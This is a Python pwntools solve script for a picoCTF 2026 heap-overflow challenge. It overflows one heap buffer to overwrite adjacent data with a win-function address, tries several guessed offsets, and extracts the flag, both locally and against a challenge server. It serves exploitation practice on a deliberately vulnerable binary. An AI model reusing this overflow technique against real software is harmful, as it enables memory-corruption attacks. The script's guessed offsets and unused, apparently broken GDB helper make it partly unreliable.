#!/usr/bin/env python3
"""
Heap Havoc - picoCTF 2026
Category: Binary Exploitation | Points: 200

Exploit: Heap buffer overflow to overwrite adjacent heap data.
The program takes two names as arguments and allocates them on the heap.
By overflowing the first buffer, we overwrite the second buffer (or a
function pointer / flag-checking variable) to trigger the win condition.

Usage:
    python3 solve.py [REMOTE]
    python3 solve.py              # run locally against ./vuln
    python3 solve.py REMOTE       # run against the remote server
"""

from pwn import *
import sys

# ============================================================
# CONFIGURATION - Update these values for your instance
# ============================================================
BINARY = "./vuln"
REMOTE_HOST = "rescued-float.picoctf.net"  # Update with actual host
REMOTE_PORT = 12345                         # Update with actual port

# Heap overflow offset: number of bytes from start of buffer 1
# to start of buffer 2 (or the target variable).
# Common values: 32, 33, 36, 40, 48 -- depends on malloc chunk size.
# Try these in order if one doesn't work.
OVERFLOW_OFFSETS = [32, 33, 36, 40, 48, 64]

# ============================================================
# HELPERS
# ============================================================

def start(argv=[], *a, **kw):
    """Start the exploit target (local or remote)."""
    if args.REMOTE or "REMOTE" in sys.argv:
        return remote(REMOTE_HOST, REMOTE_PORT)
    else:
        return process([BINARY] + argv, *a, **kw)


def find_win_function(elf):
    """Search for common win function names in the binary."""
    for name in ["win", "flag", "print_flag", "get_flag", "shell", "check_win"]:
        if name in elf.symbols:
            addr = elf.symbols[name]
            log.success(f"Found '{name}' function at: {hex(addr)}")
            return addr
    log.warning("No obvious win function found in symbols")
    return None


def find_overflow_offset_gdb():
    """Use GDB to find the distance between two malloc allocations."""
    try:
        log.info("Attempting to find heap offset via GDB...")
        gdb_script = """
set pagination off
break malloc
run AAAA BBBB
continue
p/x $rax
continue
p/x $rax
quit
"""
        result = subprocess.check_output(
            ["gdb", "-batch", "-ex", gdb_script.replace("\n", "\n-ex "), BINARY],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode()
        log.info(f"GDB output: {result}")
    except Exception as e:
        log.warning(f"GDB offset detection failed: {e}")


# ============================================================
# EXPLOIT
# ============================================================

def exploit():
    context.update(arch="amd64", os="linux", log_level="info")

    # Load the binary if available
    win_addr = None
    try:
        elf = ELF(BINARY, checksec=True)
        context.binary = elf
        win_addr = find_win_function(elf)
    except Exception:
        log.warning(f"Could not load {BINARY}")

    # -------------------------------------------------------
    # Strategy 1: Program takes names as command-line arguments
    # Overflow the first argument to corrupt the second on the heap.
    # -------------------------------------------------------

    if not args.REMOTE and "REMOTE" not in sys.argv:
        # Local exploitation -- try different offsets
        for offset in OVERFLOW_OFFSETS:
            log.info(f"Trying overflow offset: {offset}")

            # Build overflow payload for argument 1
            if win_addr:
                # Overwrite a function pointer with win address
                payload1 = b"A" * offset + p64(win_addr)
            else:
                # Overwrite the comparison value with junk to trigger
                # the "modified" code path
                payload1 = b"A" * offset + b"HACKED!!"

            payload1_str = payload1

            try:
                io = process([BINARY, payload1_str, b"normal"])
                output = io.recvall(timeout=5)
                io.close()

                if b"picoCTF{" in output or b"flag" in output.lower() or b"WIN" in output.upper():
                    log.success(f"SUCCESS with offset {offset}!")
                    log.success(f"Output: {output.decode(errors='replace')}")
                    # Extract and print flag
                    if b"picoCTF{" in output:
                        start_idx = output.index(b"picoCTF{")
                        end_idx = output.index(b"}", start_idx) + 1
                        flag = output[start_idx:end_idx].decode()
                        log.success(f"FLAG: {flag}")
                    return
            except Exception as e:
                log.debug(f"Offset {offset} failed: {e}")
                continue

        log.warning("Command-line argument approach failed. Trying stdin approach...")

    # -------------------------------------------------------
    # Strategy 2: Program reads names via stdin (remote-friendly)
    # -------------------------------------------------------

    for offset in OVERFLOW_OFFSETS:
        log.info(f"Trying stdin overflow with offset: {offset}")

        try:
            io = start()

            # Build overflow payload
            if win_addr:
                payload = b"A" * offset + p64(win_addr)
            else:
                payload = b"A" * offset + b"HACKED!!"

            # Try to detect and respond to prompts
            try:
                data = io.recvuntil(b":", timeout=3)
                log.info(f"Prompt 1: {data}")
            except Exception:
                pass

            io.sendline(payload)

            # Send second name normally
            try:
                data = io.recvuntil(b":", timeout=3)
                log.info(f"Prompt 2: {data}")
            except Exception:
                pass

            io.sendline(b"Bob")

            # Read output
            try:
                output = io.recvall(timeout=5)
                log.info(f"Output: {output.decode(errors='replace')}")

                if b"picoCTF{" in output:
                    start_idx = output.index(b"picoCTF{")
                    end_idx = output.index(b"}", start_idx) + 1
                    flag = output[start_idx:end_idx].decode()
                    log.success(f"FLAG: {flag}")
                    io.close()
                    return
                elif b"WIN" in output.upper() or b"flag" in output.lower():
                    log.success(f"Possible win: {output.decode(errors='replace')}")
                    io.close()
                    return
            except Exception:
                pass

            io.close()

        except Exception as e:
            log.debug(f"Attempt failed: {e}")
            continue

    log.warning("Automated exploit did not capture the flag.")
    log.info("Manual investigation may be needed. Tips:")
    log.info("  1. Run: checksec ./vuln")
    log.info("  2. Open in Ghidra and find malloc sizes + win condition")
    log.info("  3. In GDB, break after both mallocs and compute: addr2 - addr1")
    log.info("  4. Update OVERFLOW_OFFSETS in this script with the correct value")


if __name__ == "__main__":
    exploit()
